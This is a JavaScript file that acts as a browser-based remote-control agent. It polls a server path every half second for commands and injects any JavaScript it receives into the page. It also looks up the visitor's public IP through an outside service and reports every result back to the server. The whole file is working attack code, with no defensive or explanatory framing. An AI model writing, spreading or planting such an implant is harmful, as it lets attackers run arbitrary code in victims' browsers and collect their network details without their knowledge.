


console.log("Load OK!")

var loop;

function sendReturn(content) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET","/?=shell_return "+content,true)
    xhr.send();
}

function exec(command) {
    command = command.replace("\n","")
    if (command.replace(" ","") === 'none') {
        return false;
    }
    if (command.startsWith("js: ")) {
        var javaScript = command.substring("js: ".length,command.length);

        var script = document.createElement("script");
        script.innerHTML = javaScript;
        document.body.appendChild(script);

        sendReturn("Run JavaScript ok: "+javaScript)
        return true;
    }
    if (command === 'getip') {
        var xhr = new XMLHttpRequest();
        xhr.open("GET","https://api.ipify.org/",true)
        xhr.send();
        xhr.onload = function (e) {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    sendReturn("[IP] "+xhr.responseText);
                }
                else{
                    sendReturn("[ ERROR ] GET IP ERROR!");
                }
            }
        };
        return true;
    }
    if (command === 'getlocation')
    {
            
    }
    else {
        sendReturn("Command Error: "+command);
        return false;
    }
}

loop = setInterval(function () {
    try{
        var xhr = new XMLHttpRequest();
        xhr.open("GET","/?=shell_api",true)
        xhr.send();

        xhr.onload = function (e) {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    //console.log(xhr.responseText)
                    exec(xhr.responseText);
                }
                else{
                    clearInterval(loop);
                }
            }
        };
    }catch (e){
        clearInterval(loop);
    }
} , 500)